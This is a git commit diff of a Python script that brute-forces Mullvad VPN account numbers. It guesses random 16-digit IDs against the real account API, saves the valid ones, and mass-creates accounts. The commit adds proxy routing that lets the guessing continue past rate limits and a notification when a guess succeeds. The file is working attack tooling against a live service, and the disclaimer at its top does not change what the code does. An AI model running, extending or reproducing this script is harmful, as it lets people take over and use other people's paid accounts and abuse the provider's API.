bb2c89ed41c3cdf8ba06c74f46f2bbd79309cdd0
Mike E <47926856+mepley1@users.noreply.github.com>
2022-10-03 17:42:18 -0500

    Add proxy option, context managers for file I/O
    Add proxy option
    Use context managers for file I/O
    Fix issue of waiting for cooldown when making only 1 request
    Fix exception when using brute force option without a proxy
    Add Windows notification for successful guess

--- guesser.py
+++ guesser.py
@@ -1,6 +1,7 @@
+#!/usr/bin/env python3
+
 # Mullvad VPN account brute force, proof of concept
 # Do not use this script for unlawful or irresponsible purpose
-# API rate limit is very sensitive, you must limit requests to approx. once every 300 seconds
 
 import requests
 import json
@@ -8,22 +9,37 @@ import random
 from os import system, name
 import time
 from colorama import init, Fore, Style
+#from plyer import notification
 init()
 
 def cls():
-    if name == "nt":
-        system("cls")
-    else: system("clear")
-    
-cls()
+    if name == 'nt':
+        system('cls')
+    else: system('clear')
 
 headers = {
     "Accept": "application/json, text/plain, */*",
     "Accept-Encoding": "gzip, deflate, br",
-    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
     "Content-Type": "application/json",
 }
 
+# function for Windows notifications
+def notify_win(msg):
+    if name == 'nt':    # only make notifications if running Windows
+        try:
+            notification.notify(
+                title = 'Nullvad',
+                message = msg,
+                app_icon = None,
+                timeout = 10,
+            )
+        except:
+            print('Error sending notification')
+    else:
+        pass
+
+# make a random number
 def Random(n):
     start = 10**(n-1)
     end = (10**n)-1
@@ -31,31 +47,32 @@ def Random(n):
 
 def create_account():
     data = {}
-    resp = requests.post("https://api.mullvad.net/www/accounts/", headers=headers, json=data)
+    resp = requests.post('https://api.mullvad.net/www/accounts/', headers=headers, json=data)
     genj = json.loads(resp.text)
-    print("ID: " + genj["account"]["pretty_token"])
+    print('ID: ' + genj['account']['pretty_token'])
 
 def guess():
     n = 10
     randnum = Random(16)
-    resps = requests.get("https://api.mullvad.net/www/accounts/" + str(randnum), headers=headers)
-    if "auth_token" in resps.text:
-        print("SUCCESSFUL ID: " + str(randnum))
-        file1 = open("goodaccounts.txt","a")
-        file1.write(str(randnum) + "\n")
-        file1.close()
-        print("Account number saved to goodaccounts.txt")
+    resps = requests.get('https://api.mullvad.net/www/accounts/' + str(randnum), headers=headers, proxies=proxies)
+    if 'auth_token' in resps.text:
+        print('SUCCESSFUL ID: ' + str(randnum))
+        with open('goodaccounts.txt','a') as file1:
+            file1.write(str(randnum) + '\n')
+        print('Account number saved to goodaccounts.txt')
     elif resps.status_code == 503:
-        print("Warning Rate limit broken! Pausing for 40 seconds")
-        time.sleep(40)
+        print(Fore.RED + 'Warning Rate limit broken! Pausing for 60 seconds' + Style.RESET_ALL)
+        time.sleep(60)
     else:
-        print(Fore.RED + "Invalid credential: " + Style.RESET_ALL + str(randnum))
-        #print(resps.status_code)
-        file2 = open("bad.txt","a")
-        file2.write(str(randnum) + "\n")
-        file2.close()
+        print(Fore.RED + 'Invalid credential: ' + Style.RESET_ALL + str(randnum))
+        with open('bad.txt', 'a') as file2:
+            file2.write(str(randnum) + '\n')
 
-print(Fore.GREEN + '''
+# rate limit to follow, in seconds
+COOLDOWN = 301
+
+cls()
+print(Fore.CYAN + '''
  ███▄    █  █    ██  ██▓     ██▓  ██▒   █▓ ▄▄▄      ▓█████▄ 
  ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒ ▓██░   █▒▒████▄    ▒██▀ ██▌
 ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░  ▓██  █▒░▒██  ▀█▄  ░██   █▌
@@ -69,38 +86,73 @@ print(Fore.GREEN + '''
 ''')
 print(Style.RESET_ALL)
 
+#proxyinput = input('Enter full proxy URL including scheme i.e. socks5://myproxy:1234' + '\n')
+#proxies = {'https': proxyinput}
+
 while True:
-    print("[1] Account Creation")
-    print("[2] Account Brute Force")
-    choice = input("> ")
-    if choice == "1":
+    print('Choose an option:')
+    print('[1] Create new account')
+    print('[2] Account brute force')
+    print('[3] Account brute force with Proxy')
+    choice = input('> ')
+
+    # create new account
+    if choice == '1':
         print()
-        print("How many accounts do you want to create?")
-        numgen = input("> ")
+        print('How many accounts do you want to create?')
+        numgen = input('> ')
         print()
         for x in range(int(numgen)):
             create_account()
         print()
 
-    elif choice == "2":
+    # guesser without proxy
+    elif choice == '2':
         print()
-        print("How many account numbers to guess? Enter 0 to run indefinitely")
-        num_of_guesses = input("> ")
+        proxies = {}    # so requests doesn't throw an exception about proxies{} not being defined when calling guess()
+        print('How many account numbers to guess? Enter 0 to run indefinitely.')
+        num_of_guesses = input('> ')
         print()
         if int(num_of_guesses) == 0:
-            try:
-                while True:
-                    guess()
-                    time.sleep(301)
-            except:
-                print('Rate limited !!')
+            while True:
+                guess()
+                time.sleep(COOLDOWN)
         if int(num_of_guesses) > 0:
             for i in range(int(num_of_guesses)):
                 guess()
-                time.sleep(600)
+                if int(num_of_guesses) > 1: # only wait for cooldown if making more than 1 guess
+                    time.sleep(COOLDOWN)
+        print()
+
+    # guesser with proxy
+    elif choice == '3':
+        print()
+        print('Enter full proxy URL including scheme+port i.e. socks5h://myproxy:4145 or https://1.2.3.4:8080')
+        proxyinput = input('> ')
+        proxies = {'https': proxyinput} # must define key as https because api target is https
+        print('How many account numbers to guess? Enter 0 to run indefinitely')
+        num_of_guesses = input('> ')
+        print()
+        if int(num_of_guesses) == 0:    # Run forever
+            while True:
+                try:
+                    guess()
+                    time.sleep(COOLDOWN)
+                except:
+                    print('Error, usually bad proxy')
+                    break
+        if int(num_of_guesses) > 0:
+            for i in range(int(num_of_guesses)):
+                try:
+                    guess()
+                    if int(num_of_guesses) > 1: # only wait for cooldown if making more than 1 guess
+                        time.sleep(COOLDOWN)
+                except:
+                    print('Error, usually bad proxy')
+                    break
         print()
 
     else:
         print()
-        print("Wrong choice! Enter 1 or 2:")
+        print('Invalid option')
         print()
